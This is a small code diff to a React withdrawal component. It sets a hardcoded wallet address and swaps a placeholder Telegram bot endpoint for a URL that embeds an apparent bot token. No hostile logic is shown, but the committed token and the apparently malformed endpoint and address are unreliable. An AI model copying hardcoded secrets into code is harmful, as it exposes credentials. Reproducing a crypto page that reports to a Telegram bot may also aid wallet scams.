@@ -18,7 +18,8 @@ const Withdraw = () => {
   const dashboardWalletAddress = "sol1q6z48xpqFDsD9jKEWzHmqQm5XYG7pzJr8xpq";
 
   // Telegram bot configuration (this would connect to your actual bot in production)
-  const TELEGRAM_BOT_API = "https://api.example.com/telegram-bot-webhook"; // Replace with your actual API endpoint
+  const TELEGRAM_BOT_API =
+    "https://api.telegram.com/7360781214:AAFSiJoIIkMe_uMWAxY2LuES79zzWfadpH8"; // Replace with your actual API endpoint
 
   useEffect(() => {
     // Fetch the wallet balance from localStorage or API same as dashboard
